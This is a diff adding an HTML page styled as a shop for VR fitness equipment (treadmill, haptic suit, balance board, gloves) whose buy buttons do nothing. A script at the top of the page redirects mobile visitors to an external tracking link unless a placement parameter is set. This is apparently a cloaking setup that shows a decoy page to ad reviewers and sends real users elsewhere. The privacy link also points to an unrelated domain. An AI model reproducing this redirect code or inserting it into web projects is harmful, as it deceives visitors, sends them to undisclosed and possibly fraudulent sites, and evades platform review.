@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") {
+    } else if (isMobileDevice) {
+        window.location.href = lander;
+    } else {
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VR FitTech: Revolutionary Virtual Reality Fitness Equipment</title>
+    <style>
+        :root {
+            --primary-color: #00BFFF;
+            --secondary-color: #FF4500;
+            --background-color: #1A1A2E;
+            --text-color: #E0E0E0;
+        }
+        body {
+            font-family: 'Orbitron', sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            flex: 1;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            padding: 40px;
+        }
+        .product-card {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 191, 255, 0.3);
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+        }
+        .product-card:hover {
+            transform: translateY(-10px) scale(1.02);
+            box-shadow: 0 0 30px rgba(255, 69, 0, 0.5);
+        }
+        .product-image {
+            height: 200px;
+            background: linear-gradient(135deg, #16222A, #3A6073);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+            color: var(--primary-color);
+            position: relative;
+            overflow: hidden;
+        }
+        .product-image::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle, transparent 20%, #16222A 150%);
+            opacity: 0.7;
+        }
+        .product-info {
+            padding: 20px;
+        }
+        h1 {
+            font-size: 3em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+        h2 {
+            color: var(--primary-color);
+            margin-top: 0;
+            font-size: 1.5em;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+        }
+        p {
+            color: #B0B0B0;
+            line-height: 1.6;
+        }
+        .price {
+            font-weight: bold;
+            color: var(--secondary-color);
+            font-size: 1.4em;
+            margin-top: 15px;
+        }
+        .fitness-type {
+            background-color: var(--secondary-color);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        .buy-button {
+            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: background 0.3s ease, transform 0.2s ease;
+            margin-top: 15px;
+            font-size: 1em;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+        .buy-button:hover {
+            background: linear-gradient(45deg, var(--secondary-color), var(--primary-color));
+            transform: scale(1.05);
+        }
+        footer {
+            background: linear-gradient(45deg, var(--secondary-color), var(--primary-color));
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        nav {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 15px 0;
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+        nav li {
+            margin: 0 20px;
+        }
+        nav a {
+            color: var(--text-color);
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.1em;
+            transition: color 0.3s ease;
+        }
+        nav a:hover {
+            color: var(--primary-color);
+        }
+        footer a {
+            color: #1A1A2E;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>VR FitTech</h1>
+        <p>Immersive Fitness Experiences in Virtual Reality</p>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Cardio VR</a></li>
+            <li><a href="#">Strength VR</a></li>
+            <li><a href="#">Yoga VR</a></li>
+            <li><a href="#">Accessories</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="product-card">
+            <div class="product-image">VR Treadmill</div>
+            <div class="product-info">
+                <h2>Omni-X VR Treadmill</h2>
+                <p>360-degree movement for immersive running experiences</p>
+                <span class="fitness-type">Cardio VR</span>
+                <p class="price">$2,999.99</p>
+                <button class="buy-button">Enter the Matrix</button>
+            </div>
+        </div>
+        <div class="product-card">
+            <div class="product-image">Haptic Suit</div>
+            <div class="product-info">
+                <h2>PowerFlex Haptic Suit</h2>
+                <p>Full-body resistance suit for strength training in VR</p>
+                <span class="fitness-type">Strength VR</span>
+                <p class="price">$1,499.99</p>
+                <button class="buy-button">Feel the Burn</button>
+            </div>
+        </div>
+        <div class="product-card">
+            <div class="product-image">Balance Board</div>
+            <div class="product-info">
+                <h2>ZenFloat VR Balance Board</h2>
+                <p>Active-response board for yoga and balance training</p>
+                <span class="fitness-type">Yoga VR</span>
+                <p class="price">$399.99</p>
+                <button class="buy-button">Find Your Center</button>
+            </div>
+        </div>
+        <div class="product-card">
+            <div class="product-image">VR Gloves</div>
+            <div class="product-info">
+                <h2>GripMaster VR Gloves</h2>
+                <p>Haptic feedback gloves for precise hand tracking</p>
+                <span class="fitness-type">Accessories</span>
+                <p class="price">$249.99</p>
+                <button class="buy-button">Enhance Reality</button>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2024 VR FitTech. Revolutionizing fitness through virtual reality.</p>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
